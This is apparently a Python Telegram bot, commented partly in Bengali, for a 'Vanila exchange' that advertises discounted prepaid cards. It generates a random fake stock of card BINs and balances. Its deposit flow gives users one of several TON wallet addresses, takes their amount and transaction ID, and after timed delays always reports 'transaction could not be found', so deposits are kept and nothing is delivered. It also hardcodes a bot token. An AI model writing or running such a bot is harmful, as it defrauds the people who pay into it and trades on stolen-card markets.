import logging
import datetime
import random
import sqlite3
import asyncio
import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- Logging Setup ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- Configuration ---
BOT_TOKEN = "8312816041:AAEVEH0u7PL-MELnS3M0KhMGn84y-NBchvY"

DEPOSIT_ADDRESSES = [
    "UQCgPsBnvSib5rYln5vK0rNfYo__xjfk5OD-0mKU7-n1ACnT",
    "UQCCTTF03CCeyNKov1azQty5iNcNMnwH72J7pcb7MUaDKXsd",
    "UQAZjMCIT6MEMUgvKmweTySPrGqxnUrgvG5JQVUfnR-d_tke",
    "UQBwwD_2VekRaM-7_6wwltzkboxbTiYDqif40G9Tbnq76Td1",
    "UQAMBt7k1FZHvewkpB1IHMLiOMLZR63rO_NKv-fiQ0n5EGW_",
    "UQC9OvldFlHMbxKRq-6yRTm9uWv-YWFcsywHQAZz6p9dtonc"
]

# --- Database ---
def init_db():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, first_name TEXT, balance REAL DEFAULT 0.0)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS cards (id INTEGER PRIMARY KEY AUTOINCREMENT, bin TEXT, amount REAL, currency TEXT, sticker TEXT, status TEXT DEFAULT 'available')''')
    conn.commit()
    conn.close()

def generate_daily_cards():
    conn = sqlite3.connect('vanila_exchange.db')
    cursor = conn.cursor()
    cursor.execute("DELETE FROM cards")
    
    # আপনার দেওয়া ২৭টি বিনের তালিকা
    all_bins = [
        ('533985xx', 'CAD', '🅶'), ('461126xx', 'CAD', ''),
        ('373778xx', 'AUD', ''), ('377935xx', 'AUD', ''), ('375163xx', 'AUD', ''),
        ('435880xx', 'USD', ''), ('491277xx', 'USD', ''), ('511332xx', 'USD', '🔄'),
        ('428313xx', 'USD', ''), ('520356xx', 'USD', ''), ('409758xx', 'USD', ''),
        ('525362xx', 'USD', ''), ('451129xx', 'USD', ''), ('434340xx', 'USD', ''),
        ('426370xx', 'USD', ''), ('411810xx', 'USD', ''), ('403446xx', 'USD', ''),
        ('533621xx', 'USD', ''), ('446317xx', 'USD', ''), ('457824xx', 'USD', ''),
        ('545660xx', 'USD', ''), ('432465xx', 'USD', '🔄'), ('516612xx', 'USD', ''),
        ('484718xx', 'USD', ''), ('485246xx', 'USD', ''), ('402372xx', 'USD', ''),
        ('457851xx', 'USD', '')
    ]

    cards = []
    # ২৫০ থেকে ৩০০ এর মধ্যে র‍্যান্ডম কার্ড জেনারেট
    total_to_gen = random.randint(250, 300)
    for _ in range(total_to_gen):
        selected = random.choice(all_bins)
        bin_val, curr, stick = selected
        # র‍্যান্ডম ব্যালেন্স লজিক
        if curr == 'CAD': amt = round(random.uniform(10, 100), 2)
        elif curr == 'AUD': amt = round(random.uniform(10, 150), 2)
        else: amt = round(random.choice([random.uniform(5, 50), random.uniform(50, 500)]), 2)
        
        cards.append((bin_val, amt, curr, stick))

    cursor.executemany("INSERT INTO cards (bin, amount, currency, sticker) VALUES (?, ?, ?, ?)", cards)
    conn.commit()
    conn.close()

# --- Bot Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f"⚡️ Welcome {user.first_name} to Vanila exchange! ⚡️\nAll cards are available at 37% rate."
    kb = [[InlineKeyboardButton("💳 Stock", callback_data="page_1")],
          [InlineKeyboardButton("💰 Deposit", callback_data="deposit")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb))

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "deposit":
        addr = random.choice(DEPOSIT_ADDRESSES)
        context.user_data['active_addr'] = addr
        text = (f"⚡ VANILA Exchange — TON DEPOSIT ⚡\n\nDeposit Information: `{addr}`\n\nMinimum Deposit: `15` TON\n\nNote: Session active for 30 minutes.")
        kb = [[InlineKeyboardButton("Confirm ✅", callback_data="dep_confirm"), InlineKeyboardButton("Cancel ⛔", callback_data="dep_cancel")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif query.data == "dep_confirm":
        context.user_data['state'] = 'waiting_amount'
        await query.message.reply_text("Please enter the amount.......")

    elif query.data == "dep_cancel":
        await query.message.delete()
        await update.effective_chat.send_message("Deposit request has been canceled.❌")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    if state == 'waiting_amount':
        if update.message.text.isdigit() and int(update.message.text) >= 15:
            context.user_data['amt'] = update.message.text
            context.user_data['state'] = 'waiting_txid'
            await update.message.reply_text("Submit withdraw Txid :")
        else:
            await update.message.reply_text("Minimum deposit is 15 TON.")
            
    elif state == 'waiting_txid':
        txid = update.message.text
        amt = context.user_data.get('amt')
        addr = context.user_data.get('active_addr')
        order_no = random.randint(20991, 1000059)
        context.user_data['state'] = None
        
        res = (f"NAME : `{update.effective_user.first_name}`\nAddress : `{addr}`\nAMOUNT : `{amt}`\nTxid : `{txid}`\nOrder : `{order_no}`\nStats : `Waiting...`")
        msg = await update.message.reply_text(res, parse_mode="Markdown")
        
        await asyncio.sleep(50)
        await msg.edit_text(res.replace("`Waiting...`", "`Processing....`"), parse_mode="Markdown")
        await asyncio.sleep(55)
        await msg.edit_text(res.replace("`Waiting...`", "`transaction could not be found.`"), parse_mode="Markdown")

# --- Web Server for Render (Anti-Idle) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Alive")

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), HealthCheckHandler).serve_forever()

# --- Main Logic ---
def main():
    init_db()
    generate_daily_cards()
    
    # Render পোর্টের জন্য ওয়েব সার্ভার চালু
    threading.Thread(target=run_web_server, daemon=True).start()

    # বট শুরু
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(handle_callbacks))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
